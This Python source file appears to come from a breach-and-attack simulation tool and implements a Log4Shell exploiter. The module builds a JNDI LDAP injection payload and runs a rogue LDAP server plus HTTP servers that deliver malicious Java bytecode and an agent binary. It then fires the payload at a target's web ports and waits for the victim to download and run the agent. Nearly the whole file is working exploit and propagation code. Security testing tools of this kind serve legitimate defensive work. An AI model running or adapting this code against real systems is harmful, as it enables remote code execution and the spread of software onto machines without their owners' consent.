import logging
import time
from pathlib import PurePath

from common import OperatingSystem
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT, MEDIUM_REQUEST_TIMEOUT
from common.tags import (
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
    T1203_ATTACK_TECHNIQUE_TAG,
)
from common.utils import Timer
from infection_monkey.exploit.log4shell_utils import (
    LINUX_EXPLOIT_TEMPLATE_PATH,
    WINDOWS_EXPLOIT_TEMPLATE_PATH,
    ExploitClassHTTPServer,
    LDAPExploitServer,
    build_exploit_bytecode,
    get_log4shell_service_exploiters,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.i_puppet.i_puppet import ExploiterResultData
from infection_monkey.model import DROPPER_ARG, LOG4SHELL_LINUX_COMMAND, LOG4SHELL_WINDOWS_COMMAND
from infection_monkey.network.info import get_free_tcp_port
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.monkey_dir import get_monkey_dir_path
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)

LOG4SHELL_EXPLOITER_TAG = "log4shell-exploiter"
VICTIM_WAIT_SLEEP_TIME_SEC = 0.050


class Log4ShellExploiter(WebRCE):
    _EXPLOITED_SERVICE = "Log4j"
    SERVER_SHUTDOWN_TIMEOUT = LONG_REQUEST_TIMEOUT
    REQUEST_TO_VICTIM_TIMEOUT = MEDIUM_REQUEST_TIMEOUT

    _EXPLOITER_TAGS = (
        LOG4SHELL_EXPLOITER_TAG,
        T1110_ATTACK_TECHNIQUE_TAG,
        T1203_ATTACK_TECHNIQUE_TAG,
    )
    _PROPAGATION_TAGS = (
        LOG4SHELL_EXPLOITER_TAG,
        T1203_ATTACK_TECHNIQUE_TAG,
        T1105_ATTACK_TECHNIQUE_TAG,
    )

    def _exploit_host(self) -> ExploiterResultData:
        self._open_ports = [
            int(port[0]) for port in WebRCE.get_open_service_ports(self.host, self.HTTP, ["http"])
        ]

        if not self._open_ports:
            logger.info("Could not find any open web ports to exploit")
            return self.exploit_result

        self._configure_servers()
        self._start_servers()
        try:
            self.exploit(None, None)
            return self.exploit_result
        finally:
            self._stop_servers()

    def _configure_servers(self):
        self._ldap_port = get_free_tcp_port()

        self._class_http_server_ip = get_interface_to_target(str(self.host.ip))
        self._class_http_server_port = get_free_tcp_port()

        self._ldap_server = None
        self._exploit_class_http_server = None
        self._agent_http_server_thread = None

    def _start_servers(self):
        target_path = get_agent_dst_path(self.host)

        # Start http server, to serve agent to victims
        agent_http_path = self._start_agent_http_server()

        # Build agent execution command
        command = self._build_command(target_path, agent_http_path)

        # Start http server to serve malicious java class to victim
        self._start_class_http_server(command)

        # Start ldap server to redirect ldap query to java class server
        self._start_ldap_server()

    def _start_agent_http_server(self) -> str:
        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.try_create_locked_transfer(
            self.host, self.agent_binary_repository
        )
        self._agent_http_server_thread = http_thread
        return http_path

    def _start_class_http_server(self, command: str):
        java_class = self._build_java_class(command)

        self._exploit_class_http_server = ExploitClassHTTPServer(
            self._class_http_server_ip, self._class_http_server_port, java_class
        )
        self._exploit_class_http_server.run()

    def _start_ldap_server(self):
        self._ldap_server = LDAPExploitServer(
            ldap_server_port=self._ldap_port,
            http_server_ip=self._class_http_server_ip,
            http_server_port=self._class_http_server_port,
            storage_dir=get_monkey_dir_path(),
        )
        self._ldap_server.run()

    def _stop_servers(self):
        logger.debug("Stopping all LDAP and HTTP Servers")
        self._agent_http_server_thread.stop(Log4ShellExploiter.SERVER_SHUTDOWN_TIMEOUT)

        self._exploit_class_http_server.stop(Log4ShellExploiter.SERVER_SHUTDOWN_TIMEOUT)

        self._ldap_server.stop(Log4ShellExploiter.SERVER_SHUTDOWN_TIMEOUT)

    def _build_ldap_payload(self) -> str:
        interface_ip = get_interface_to_target(str(self.host.ip))
        return f"${{jndi:ldap://{interface_ip}:{self._ldap_port}/dn=Exploit}}"

    def _build_command(self, path: PurePath, http_path) -> str:
        # Build command to execute
        monkey_cmd = build_monkey_commandline(self.servers, self.current_depth + 1, location=path)
        if OperatingSystem.WINDOWS == self.host.operating_system:
            base_command = LOG4SHELL_WINDOWS_COMMAND
        else:
            base_command = LOG4SHELL_LINUX_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": DROPPER_ARG,
            "parameters": monkey_cmd,
        }

    def _build_java_class(self, exploit_command: str) -> bytes:
        if OperatingSystem.LINUX == self.host.operating_system:
            return build_exploit_bytecode(exploit_command, LINUX_EXPLOIT_TEMPLATE_PATH)
        else:
            return build_exploit_bytecode(exploit_command, WINDOWS_EXPLOIT_TEMPLATE_PATH)

    def exploit(self, url, command) -> None:
        # Try to exploit all services,
        # because we don't know which services are running and on which ports
        for exploit in get_log4shell_service_exploiters():
            intr_ports = interruptible_iter(self._open_ports, self.interrupt)
            for port in intr_ports:

                logger.debug(
                    f'Attempting Log4Shell exploit on for service "{exploit.service_name}"'
                    f"on port {port}"
                )
                try:
                    timestamp = time.time()
                    url = exploit.trigger_exploit(self._build_ldap_payload(), self.host, port)
                except Exception as err:
                    error_message = (
                        "An error occurred while attempting to exploit log4shell on a "
                        f"potential {exploit.service_name} service: {err}"
                    )

                    logger.warning(error_message)
                    self._publish_exploitation_event(timestamp, False, error_message=error_message)

                # TODO: _wait_for_victim() gets called even if trigger_exploit() raises an
                #       exception. Is that the desired behavior?
                if self._wait_for_victim(timestamp):
                    self.exploit_info["vulnerable_service"] = {
                        "service_name": exploit.service_name,
                        "port": port,
                    }
                    self.exploit_info["vulnerable_urls"].append(url)

    def _wait_for_victim(self, timestamp: float) -> bool:
        victim_called_back = self._wait_for_victim_to_download_java_bytecode()
        if victim_called_back:
            self._publish_exploitation_event(timestamp, True)

            victim_downloaded_agent = self._wait_for_victim_to_download_agent()
            self._publish_propagation_event(success=victim_downloaded_agent)
        else:
            error_message = "Timed out while waiting for victim to download the java bytecode"
            logger.debug(error_message)
            self._publish_exploitation_event(timestamp, False, error_message=error_message)

        return victim_called_back

    def _wait_for_victim_to_download_java_bytecode(self) -> bool:
        timer = Timer()
        timer.set(Log4ShellExploiter.REQUEST_TO_VICTIM_TIMEOUT)

        while not timer.is_expired():
            if self._exploit_class_http_server.exploit_class_downloaded():
                self.exploit_result.exploitation_success = True
                return True

            time.sleep(VICTIM_WAIT_SLEEP_TIME_SEC)

        return False

    def _wait_for_victim_to_download_agent(self) -> bool:
        timer = Timer()
        timer.set(LONG_REQUEST_TIMEOUT)

        while not timer.is_expired():
            if self._agent_http_server_thread.downloads > 0:
                self.exploit_result.propagation_success = True
                return True

            # TODO: if the http server got an error we're waiting for nothing here
            time.sleep(VICTIM_WAIT_SLEEP_TIME_SEC)

        return False
